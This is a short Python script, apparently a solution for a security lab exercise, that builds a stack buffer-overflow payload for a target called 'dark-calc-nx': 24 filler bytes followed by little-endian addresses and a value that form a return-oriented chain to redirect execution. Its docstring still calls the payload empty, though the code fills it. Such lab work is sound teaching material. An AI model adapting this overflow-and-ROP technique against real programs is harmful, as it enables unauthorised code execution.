#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
payload = b"A" * 24
payload += (0x401a34).to_bytes(8, 'little')
payload += (0x401a33).to_bytes(8, 'little')
payload += (4).to_bytes(8, 'little')
payload += (0x401978).to_bytes(8, 'little')
sys.stdout.buffer.write(payload + b"\n")